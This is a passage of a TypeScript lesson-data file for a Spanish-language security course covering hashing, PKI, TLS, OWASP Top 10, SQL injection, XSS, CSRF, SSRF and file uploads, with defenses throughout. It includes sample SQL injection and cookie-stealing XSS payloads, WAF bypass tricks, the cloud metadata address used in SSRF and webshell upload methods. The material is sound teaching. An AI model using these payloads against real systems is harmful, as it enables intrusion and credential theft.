      { h: "Password Hashing", c: "❌ NUNCA guardar passwords en texto plano ni con MD5/SHA simple.\n\n🧂 **Salt** — Valor aleatorio único por usuario → evita rainbow tables y que dos passwords iguales tengan el mismo hash.\n🐢 **Key stretching** — Algoritmos LENTOS a propósito para frustrar brute force:\n→ **bcrypt** — Clásico, con cost factor\n→ **scrypt** — Resistente a hardware (memory-hard)\n→ **Argon2** — Ganador del Password Hashing Competition, el recomendado\n\n**Rainbow tables:** tablas precomputadas de hash→password; el salt las anula." },
      { h: "PKI y Certificados", c: "🏛️ **PKI** (Public Key Infrastructure) gestiona certificados digitales:\n→ **CA** (Certificate Authority) — Emite y firma certificados\n→ **Certificado X.509** — Liga una clave pública a una identidad (dominio)\n→ **Cadena de confianza** — Tu navegador confía en CAs raíz → que firman intermedias → que firman el cert del sitio\n→ **Revocación:** CRL y OCSP\n\n🔍 **Certificate Transparency** — Logs públicos de certificados emitidos (detectar emisiones fraudulentas).\n📌 **Certificate Pinning** — La app solo acepta un cert/CA específico (anti-MITM)." },
    ],
  },
  {
    id: 23,
    title: "TLS/SSL y VPN",
    sub: "M19",
    dur: "35m",
    diff: "Avanzado",
    sections: [
      { h: "TLS Handshake", c: "🔒 **TLS** cifra la comunicación (HTTPS = HTTP sobre TLS). SSL está obsoleto.\n\n**TLS 1.3 handshake (simplificado):**\n1. ClientHello (versiones, cipher suites, key share)\n2. ServerHello + certificado + key share\n3. Ambos derivan la clave de sesión (ECDHE)\n4. Comunicación cifrada\n\n**TLS 1.3 vs 1.2:** 1.3 es más rápido (1-RTT, 0-RTT), eliminó cipher suites inseguros (RSA key exchange, CBC, RC4) y exige **forward secrecy**." },
      { h: "Ataques a TLS", c: "💔 **Heartbleed** (2014, CVE-2014-0160) — Bug en OpenSSL que filtraba memoria del servidor (claves, datos).\n🪤 **SSL Stripping** — MITM degrada HTTPS→HTTP. Lo previene **HSTS** (fuerza HTTPS).\n⬇️ **Downgrade attacks** (POODLE, FREAK) — Forzar versiones/ciphers viejos.\n\n**Defensa:** TLS 1.2+ solamente, HSTS con preload, deshabilitar ciphers débiles, certificados válidos, OCSP stapling." },
      { h: "VPN", c: "🌐 Una **VPN** crea un túnel cifrado sobre una red insegura.\n→ **IPSec** — Estándar (site-to-site, corporativo), modos transport/tunnel\n→ **WireGuard** — Moderno, rápido, código mínimo, criptografía fija (ChaCha20, Curve25519)\n→ **OpenVPN** — Flexible, sobre TLS\n\n⚠️ Una VPN cifra el tránsito, NO te hace anónimo ni inmune a malware. Un endpoint comprometido sigue comprometido." },
    ],
  },
  {
    id: 24,
    title: "Seguridad Web: Fundamentos",
    sub: "M20",
    dur: "30m",
    diff: "Intermedio",
    sections: [
      { h: "HTTP y Arquitectura", c: "🌍 La web es cliente (navegador) ↔ servidor sobre **HTTP**, que es **stateless** (cada request es independiente; el estado se mantiene con cookies/tokens).\n\n**Métodos:** GET (leer), POST (crear), PUT/PATCH (actualizar), DELETE\n**Status:** 2xx ok · 3xx redirect · 4xx error cliente (401 no auth, 403 prohibido, 404) · 5xx error servidor\n\nCada request/response tiene headers — muchos son críticos para seguridad." },
      { h: "Security Headers", c: "🛡️ Headers de respuesta que mitigan ataques:\n→ **Content-Security-Policy (CSP)** — Controla qué scripts/recursos cargan → frena XSS\n→ **Strict-Transport-Security (HSTS)** — Fuerza HTTPS\n→ **X-Frame-Options / frame-ancestors** — Anti-clickjacking\n→ **X-Content-Type-Options: nosniff** — Evita MIME sniffing\n→ **Referrer-Policy** — Controla fuga de URLs\n\n💡 AlphaLog setea CSP, HSTS y X-Frame-Options en next.config + middleware." },
      { h: "CORS, SOP y Cookies", c: "🔐 **Same-Origin Policy (SOP)** — Por defecto, un origen no puede leer recursos de otro origen (protocolo+dominio+puerto).\n🔓 **CORS** — Mecanismo para relajar SOP de forma controlada (Access-Control-Allow-Origin). Mal configurado (`*` con credenciales) = fuga de datos.\n\n🍪 **Cookies seguras:**\n→ **HttpOnly** — Inaccesible desde JS (anti-XSS theft)\n→ **Secure** — Solo por HTTPS\n→ **SameSite** (Lax/Strict) — Anti-CSRF" },
    ],
  },
  {
    id: 25,
    title: "OWASP Top 10 (Parte 1)",
    sub: "M21",
    dur: "35m",
    diff: "Intermedio",
    sections: [
      { h: "A01-A02", c: "🥇 **A01 — Broken Access Control** (#1 actual). Usuarios acceden a lo que no deberían:\n→ **IDOR** — Cambiar /user/123 por /user/124 y ver datos ajenos\n→ Forzar navegación a rutas admin, escalada vertical/horizontal\n\n🔐 **A02 — Cryptographic Failures** — Datos sensibles mal protegidos: sin cifrar, TLS débil, hashes obsoletos, claves expuestas." },
      { h: "A03-A04", c: "💉 **A03 — Injection** — Entrada no confiable interpretada como comando: SQLi, NoSQLi, command injection, LDAP injection. La defensa: parametrizar y validar.\n\n🏗️ **A04 — Insecure Design** — Fallas en el diseño, no en la implementación. Falta de threat modeling, ausencia de límites de tasa, lógica de negocio explotable. No se parchea con un fix puntual: requiere repensar." },
      { h: "A05", c: "⚙️ **A05 — Security Misconfiguration** — La causa de incontables brechas:\n→ Credenciales/cuentas por defecto\n→ Servicios y puertos innecesarios expuestos\n→ Mensajes de error verbosos (stack traces)\n→ Buckets S3 públicos\n→ Headers de seguridad ausentes\n→ Software desactualizado\n\nHardening + revisión de configuración + automatización (IaC scanning) lo previenen." },
    ],
  },
  {
    id: 26,
    title: "OWASP Top 10 (Parte 2)",
    sub: "M22",
    dur: "35m",
    diff: "Intermedio",
    sections: [
      { h: "A06-A07", c: "📦 **A06 — Vulnerable and Outdated Components** — Usar librerías con CVEs conocidos. Ejemplo emblemático: **Log4Shell** (CVE-2021-44228) en Log4j permitió RCE masivo. Defensa: SCA (dependency scanning), SBOM, actualizar.\n\n🔑 **A07 — Identification and Authentication Failures** — Passwords débiles, sin MFA, session fixation, credential stuffing, tokens predecibles." },
      { h: "A08-A09", c: "🧩 **A08 — Software and Data Integrity Failures** — Confiar en código/datos sin verificar integridad: updates sin firmar, deserialización insegura, pipelines CI/CD comprometidos (SolarWinds).\n\n📋 **A09 — Security Logging and Monitoring Failures** — Sin logs ni alertas, los ataques pasan desapercibidos por meses. Loguear eventos de seguridad, centralizar (SIEM), alertar." },
      { h: "A10 — SSRF", c: "🎯 **A10 — Server-Side Request Forgery** — El servidor es engañado para hacer requests a destinos elegidos por el atacante:\n→ Acceder a servicios internos (no expuestos)\n→ Leer metadata de cloud: http://169.254.169.254/ (credenciales IAM)\n\n💥 El caso **Capital One (2019)** explotó exactamente esto vía un WAF mal configurado para robar datos de 100M+ personas desde AWS.\n\n**Defensa:** allowlist de destinos, bloquear IPs internas/metadata, validar URLs." },
    ],
  },
  {
    id: 27,
    title: "SQL Injection y XSS",
    sub: "M23",
    dur: "40m",
    diff: "Avanzado",
    sections: [
      { h: "SQL Injection", c: "💉 SQLi inyecta SQL a través de entrada no sanitizada.\n**Clásico:** ' OR 1=1 --\n**UNION:** ' UNION SELECT username,password FROM users --\n**Blind boolean:** ' AND SUBSTRING(@@version,1,1)='8' --\n**Time-based:** ' AND IF(1=1,SLEEP(5),0) --\n\n🔧 **sqlmap** automatiza detección y explotación.\n✅ **Prevención:** prepared statements / parameterized queries (separan datos de código), ORM, least privilege en el usuario de DB, WAF." },
      { h: "XSS", c: "📜 XSS inyecta JavaScript que corre en el navegador de la víctima:\n→ **Reflected** — En la URL: ?q=<script>...</script>\n→ **Stored** — Persistido (comentario): <img src=x onerror=alert(document.cookie)>\n→ **DOM-based** — En el JS del cliente, sin tocar el servidor\n\n**Impacto:** robo de cookies/sesión, keylogging, defacement, acciones en nombre del usuario.\n✅ **Prevención:** output encoding contextual, CSP, cookies HttpOnly, sanitización (DOMPurify), frameworks que escapan por defecto." },
      { h: "WAF y Bypass", c: "🧱 Un **WAF** (Web Application Firewall) filtra requests maliciosos por patrones. Útil como capa, no como única defensa.\n\n**Técnicas de bypass (concepto):**\n→ Encoding (URL, hex, unicode) y case mixing\n→ Comentarios SQL (UN/**/ION)\n→ Payloads políglota\n→ Fragmentación\n\nPor eso el WAF complementa, pero la corrección real es código seguro (parametrización + encoding)." },
    ],
  },
  {
    id: 28,
    title: "CSRF, SSRF y File Upload",
    sub: "M24",
    dur: "35m",
    diff: "Avanzado",
    sections: [
      { h: "CSRF", c: "🎭 **CSRF** (Cross-Site Request Forgery) — Engaña al navegador de una víctima autenticada para que ejecute una acción no deseada (transferir dinero, cambiar email) usando su sesión.\n\nFunciona porque el navegador adjunta cookies automáticamente.\n\n✅ **Defensa:**\n→ **Tokens anti-CSRF** únicos por sesión/request (AlphaLog usa cookie al_csrf + header x-csrf-token)\n→ Cookies **SameSite=Lax/Strict**\n→ Verificar Origin/Referer en mutaciones" },
      { h: "SSRF e IDOR", c: "🎯 **SSRF** — Forzar al servidor a pedir URLs internas o metadata cloud (169.254.169.254). Ya visto en OWASP A10 (Capital One). Defensa: allowlist, bloquear rangos internos.\n\n🔢 **IDOR** (Insecure Direct Object Reference) — Acceder a objetos ajenos cambiando un identificador (/invoice/1001 → /invoice/1002). Defensa: verificar **autorización por objeto** en el servidor (no confiar en el ID del cliente). En AlphaLog, RLS de Supabase lo previene a nivel DB." },
      { h: "File Upload", c: "📎 Las subidas de archivos mal validadas permiten:\n→ Subir un **webshell** (shell.php) y ejecutarlo → RCE\n→ Bypass por Content-Type falso o doble extensión (shell.php.jpg)\n→ Path traversal en el nombre (../../)\n→ XSS vía SVG/HTML, zip bombs (DoS)\n\n✅ **Defensa:** validar tipo por contenido (magic bytes) no por extensión, renombrar archivos, almacenar fuera del webroot o en storage dedicado, límites de tamaño, escaneo AV." },
    ],
  },
];

export function getLesson(id: number): Lesson | undefined {
  return LESSONS.find((l) => l.id === id);
}

// Maps a module id (e.g. 1) to the lessons whose `sub` references that module ("M1").
export function lessonsForModule(moduleId: number): Lesson[] {
  const tag = `M${moduleId}`;
  return LESSONS.filter((l) => l.sub === tag);
}
